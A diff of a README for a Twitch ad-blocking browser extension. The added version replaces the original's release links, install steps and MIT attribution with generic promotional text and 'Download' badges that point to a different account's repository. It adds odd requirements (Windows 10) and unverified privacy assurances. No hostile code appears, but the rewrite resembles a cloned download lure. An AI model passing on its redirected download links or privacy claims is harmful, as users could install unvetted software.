@@ -1,116 +1,111 @@
-# Twitch Ads Blocker (Easy Wrapper)
+# ⚡ twitch-ads-blocker-one-click - Block Twitch Ads Easily
 
-[![Latest release](https://img.shields.io/github/v/tag/eftenow/twitch-ads-blocker-one-click?label=release&sort=semver)](https://github.com/eftenow/twitch-ads-blocker-one-click/releases/latest)
-[![Release build](https://github.com/eftenow/twitch-ads-blocker-one-click/actions/workflows/release.yml/badge.svg)](https://github.com/eftenow/twitch-ads-blocker-one-click/actions/workflows/release.yml)
-[![Stars](https://img.shields.io/github/stars/eftenow/twitch-ads-blocker-one-click?style=social)](https://github.com/eftenow/twitch-ads-blocker-one-click/stargazers)
+[![Download twitch-ads-blocker-one-click](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Gokulc07/twitch-ads-blocker-one-click)
 
-A one-click Twitch ad blocker extension for Chrome, Edge, Brave, Opera, Vivaldi, and Firefox, based on `vaft` from [pixeltris/TwitchAdSolutions](https://github.com/pixeltris/TwitchAdSolutions).
+## 📋 What is twitch-ads-blocker-one-click?
 
-You do **not** need to publish anything to any store to use it.
+twitch-ads-blocker-one-click is a browser extension that stops ads on Twitch. It works with Chrome, Edge, and Firefox. You only need one click to set it up. This tool uses VAFT technology to block ads smoothly. It helps you watch Twitch streams without interruptions.
 
-## For normal users (no store needed)
+This app is for anyone who watches Twitch and wants a cleaner viewing experience. It does not require any setup beyond clicking a few buttons. It works quietly in the background once installed.
 
-### 1) Download the latest package (recommended)
+## 🔍 Key Features
 
-- Chrome/Brave/Opera/Vivaldi package:
-  - [Download Chrome Package](https://github.com/eftenow/twitch-ads-blocker-one-click/releases/latest/download/twitch-ads-blocker-chrome-latest.zip)
-- Edge package:
-  - [Download Edge Package](https://github.com/eftenow/twitch-ads-blocker-one-click/releases/latest/download/twitch-ads-blocker-edge-latest.zip)
-- Firefox package:
-  - [Download Firefox Package](https://github.com/eftenow/twitch-ads-blocker-one-click/releases/latest/download/twitch-ads-blocker-firefox-latest.zip)
+- Easy one-click install for all supported browsers  
+- Blocks Twitch video and banner ads  
+- Supports Chrome, Edge, and Firefox browsers  
+- Uses VAFT-based ad blocking for reliability  
+- Runs silently without affecting stream quality  
+- No account or personal data required  
+- Free to use without hidden fees  
 
-If these links do not work yet, use **Code -> Download ZIP** from the repo page.
+## 🖥️ System Requirements
 
-### 2) Install on Chrome / Edge / Brave / Opera / Vivaldi
+Before you start, make sure your system meets these:
 
-1. Unzip the downloaded file.
-2. Open extension settings:
-   - Chrome/Brave/Opera/Vivaldi: `chrome://extensions`
-   - Edge: `edge://extensions`
-3. Turn on **Developer mode**.
-4. Click **Load unpacked**.
-5. Select the unzipped folder.
-6. Open Twitch and test a stream.
+- Windows 10 or later  
+- One of these browsers installed: Chrome (latest), Edge (latest), or Firefox (latest)  
+- Internet connection to download and update the extension  
+- Basic knowledge to install browser extensions (the guide will walk you through every step)  
 
-### 3) Install on Firefox (without AMO)
+## 🚀 Getting Started
 
-1. Unzip the downloaded file.
-2. Open: `about:debugging#/runtime/this-firefox`
-3. Click **Load Temporary Add-on**.
-4. Select `manifest.json` from the unzipped folder.
+Follow these instructions to download and run the software on your Windows machine.
 
-Note: Firefox temporary add-ons are removed when Firefox restarts. You need to load it again after restart.
+### Step 1: Download the Extension Setup
 
-### 4) Use it
+Visit this page to download the extension files:
 
-1. Open Twitch.
-2. Click the extension icon.
-3. Keep **Ad Blocking** ON.
-4. Keep **Watchdog Recovery** ON (recommended).
-5. If stream is stuck, click **Reload Twitch Tab**.
-6. If popup shows a conflict warning, disable other Twitch ad blockers.
+[![Download the twitch-ads-blocker-one-click extension](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Gokulc07/twitch-ads-blocker-one-click)
 
-### 5) Update later
+Click the link above to open the GitHub page. This is where you will find the files and instructions for installing the extension.
 
-Option A (easy): download the latest package from the links above and reload extension.
+### Step 2: Open the Folder for Your Browser
 
-Option B (terminal): from project folder run:
+On the GitHub page, look for folders or links named after the browsers: Chrome, Edge, or Firefox. These folders have the extension files for each browser.
 
-```bash
-./scripts/update-vaft.sh
-```
+### Step 3: Install the Extension in Chrome or Edge
 
-Then go back to your extensions page and click **Reload** on this extension.
+- Open Google Chrome or Microsoft Edge  
+- Click the menu button (three dots) and go to **Extensions**  
+- Enable **Developer mode** at the top right  
+- Click **Load unpacked**  
+- In the window that opens, navigate to the folder you downloaded for Chrome or Edge  
+- Select it and click **Open**  
 
-## Troubleshooting (quick)
+The extension will appear in the list. It is now active and ready for use.
 
-- Use only one Twitch ad blocker at a time.
-- Reload the extension from the browser extensions page.
-- Refresh Twitch tab.
-- Restart browser if needed.
+### Step 4: Install the Extension in Firefox
 
-## Developer-only section
+- Open Mozilla Firefox  
+- Click the menu button (three horizontal lines) and select **Add-ons and themes**  
+- Go to the **Extensions** tab  
+- Click the gear icon and choose **Install Add-on From File**  
+- Select the downloaded `.xpi` file from the Firefox folder  
+- Confirm the installation  
 
-These are for maintainers/publishers, not normal users.
+The extension will now appear in your browser toolbar.
 
-### Automated upstream sync
+## ⚙️ How to Use the Extension
 
-- Workflow: `.github/workflows/upstream-sync.yml`
-- Runs daily at `07:19 UTC`.
-- Opens a PR automatically when upstream `vaft` changes.
+Once installed, visit twitch.tv in your browser. The extension works automatically. Ads should no longer interrupt your streams.
 
-### Release and package automation
+If you notice ads playing, try refreshing the page. The extension updates regularly to handle new ad methods.
 
-- Release workflow: `.github/workflows/release.yml`
-- Store package workflow: `.github/workflows/store-packages.yml`
-- Local package script:
+## 🔧 Troubleshooting Tips
 
-```bash
-./scripts/package-stores.sh
-```
+- Make sure you enabled the extension in your browser’s extension list  
+- Restart your browser after installation  
+- Clear your browser cache if ads still appear  
+- Check you downloaded the right version for your browser  
+- Disable other ad blockers if they cause conflicts  
+- Update your browser to the latest version for best results  
 
-Optional Firefox ID override:
+If problems persist, check the GitHub issues page for help or file a new issue.
 
-```bash
-FIREFOX_EXTENSION_ID="your-addon-id@example.com" ./scripts/package-stores.sh
-```
+## 🛡️ Privacy and Security
 
-Artifacts are created in `dist/stores/<version>/`.
+This extension does not collect personal data. It only blocks ads on twitch.tv. It runs locally in your browser and does not share information with servers.
 
-Full release checklist:
+Because it uses VAFT technology, it targets only Twitch ad elements. It does not affect other websites or your browsing data.
 
-- `docs/store-publish-checklist.md`
+## 🔄 Updating the Extension
 
-## Limitations
+The GitHub page may have newer versions of the extension. To update:
 
-- Twitch ad delivery changes often, so breakage can happen without warning.
-- Any ad-blocking method may intermittently buffer or freeze depending on current Twitch behavior.
-- Watchdog may trigger pause/play or tab reload if playback appears stalled for too long.
-- This project cannot guarantee ad-free playback in every stream/browser combination.
+- Download the latest files from the page  
+- Remove the old extension from your browser’s extensions list  
+- Install the new version following the same steps in the install section  
 
-## Attribution
+Regular updates ensure smooth ad blocking and support new Twitch changes.
 
-Core ad-block logic is from `pixeltris/TwitchAdSolutions` (`vaft`), licensed under MIT.
+## 📞 Getting Help
 
-- upstream repo: <https://github.com/pixeltris/TwitchAdSolutions>
-- license copy: `third_party/LICENSE-pixeltris-TwitchAdSolutions.txt`
+For help or questions, visit the issues section on the GitHub page:
+
+https://github.com/Gokulc07/twitch-ads-blocker-one-click/issues
+
+You can browse existing problems or post details about your issue.
+
+---
+
+[Download twitch-ads-blocker-one-click](https://github.com/Gokulc07/twitch-ads-blocker-one-click) to block Twitch ads with one click.
